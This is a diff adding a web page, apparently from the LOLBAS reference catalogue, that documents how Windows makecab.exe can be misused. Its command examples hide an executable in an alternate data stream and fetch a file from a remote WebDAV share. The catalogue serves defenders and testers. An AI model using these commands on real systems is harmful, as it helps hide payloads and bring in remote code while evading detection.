@@ -31,7 +31,102 @@
 </h1>
 
 
+<ul class="function-list">
+    
+    
+    <li><a href="/lolbas/Binaries/Makecab/#ads">Alternate data streams</a></li>
+    
+    
+    <li><a href="/lolbas/Binaries/Makecab/#download">Download</a></li>
+    
+</ul>
 
+<p>Used in Windows to generate cabinet files</p>
+
+<br>
+<p><b>Paths:</b> 
+	<ul style="list-style-type:none">
+	
+	<li>c:\windows\system32\makecab.exe</li>
+	
+	<li>c:\windows\sysWOW64\makecab.exe</li>
+	 
+	</ul>
+</p>
+<br>
+<b>Resources:</b> 	
+	<ul style="list-style-type:none">
+	
+	<li><a href="https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f">https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</a></li>
+	 
+	</ul>
+<br>
+<b>Contributors:</b> <p>Thanks to Oddvar Moe - @oddvarmoe</p>
+
+<br>
+
+
+
+
+
+
+<h2 id="ads" class="function-name">Alternate data streams</h2>
+
+<p>The LOLBAS can write or read alternate data streams.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.</p>
+
+        <pre><code>makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Compresses the target file into a CAB file stored in the Alternate Data Stream (ADS) of the target file.</p>
+
+        <pre><code>makecab \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
+
+
+
+
+
+<h2 id="download" class="function-name">Download</h2>
+
+<p>The LOLBAS can download files.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Download and compresses the target file and stores it in the target file.</p>
+
+        <pre><code>makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
 
 
 
